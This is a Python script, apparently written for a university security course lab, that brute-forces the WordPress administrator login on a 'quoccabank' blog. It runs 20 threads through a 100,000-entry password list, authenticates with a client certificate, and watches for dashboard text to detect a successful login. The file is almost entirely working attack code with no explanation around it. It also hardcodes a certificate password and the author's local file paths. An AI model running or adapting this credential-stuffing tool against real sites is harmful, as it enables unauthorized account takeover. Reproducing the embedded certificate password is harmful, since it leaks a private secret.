from requests_pkcs12 import post
from concurrent.futures import ThreadPoolExecutor, as_completed
import re

# Define your base URL and the path to your PKCS#12 certificate and its password
base_url = 'https://blog.quoccabank.com/wp-login.php'
p12_path = '/Users/bryanle/Downloads/z5361001.p12'
p12_password = 'Qs3/Keg5W3D/kSJJfp9ltw=='

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': '*/*',
    'Origin': 'https://blog.quoccabank.com',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://blog.quoccabank.com/wp-login.php',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'en-US,en;q=0.9',
}

# cookies = {
#     'wordpress_test_cookie': 'WP Cookie check',
#     'wp_lang': 'en_US',
# }

# Function to attempt login with a given password
def attempt_login(password):
    data = {
        'log': 'administrator',
        'pwd': password,
        # 'wp-submit': 'Log In',
    }
    response = post(
        base_url, 
    headers=headers, 
    # cookies=cookies, 
    data=data, 
    pkcs12_filename=p12_path, 
    pkcs12_password=p12_password)
    
    # Logic to check login success and return result
    if 'Dashboard' in response.text or 'Personal Options' in response.text:
        return password, True
    return password, False

# Load your password list
with open('/Users/bryanle/Downloads/10-million-password-list-top-100000.txt', 'r') as file:
    passwords = file.read().splitlines()

# Number of threads to use (adjust based on your system and network capabilities)
MAX_WORKERS = 20
count = 1
# Create a thread pool and issue login attempts
with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
    # Mapping of future to password for identifying which password was used when a future completes
    future_to_password = {executor.submit(attempt_login, password): password for password in passwords}
    
    # Process as each future completes
    for future in as_completed(future_to_password):
        password, success = future.result()
        if success:
            print(f'{count} - Success! Logged in with password: {password}')
            break
        else:
            print(f'{count} - Failed login with password: {password}')
        count += 1
